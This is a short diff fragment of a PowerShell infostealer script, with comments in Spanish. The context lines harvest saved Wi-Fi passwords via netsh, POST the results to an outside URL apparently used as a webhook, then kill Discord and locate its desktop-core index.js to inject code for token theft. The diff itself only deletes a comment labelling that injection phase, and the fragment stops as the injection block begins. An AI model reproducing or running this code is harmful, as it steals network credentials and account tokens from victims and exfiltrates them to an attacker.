@@ -15,7 +15,6 @@ foreach($n in $pr){$v=netsh wlan show prof name="$n" key=clear|sls 'Key Content|
 $j=@{content='```'+$out+'```'}|ConvertTo-Json;
 Invoke-RestMethod -Uri $w -Method Post -Body ([System.Text.Encoding]::UTF8.GetBytes($j)) -ContentType 'application/json';
 
-# FASE 2: INYECCIÓN DE DISCORD (Solo Token, sin nombre de PC)
 Stop-Process -Name Discord -Force -ErrorAction SilentlyContinue;
 $f=(Get-ChildItem -Path "$env:LOCALAPPDATA\Discord\app-*" -Filter "index.js" -Recurse | Where-Object {$_.FullName -like "*discord_desktop_core*"} | Select-Object -ExpandProperty FullName -First 1);
 if($f){
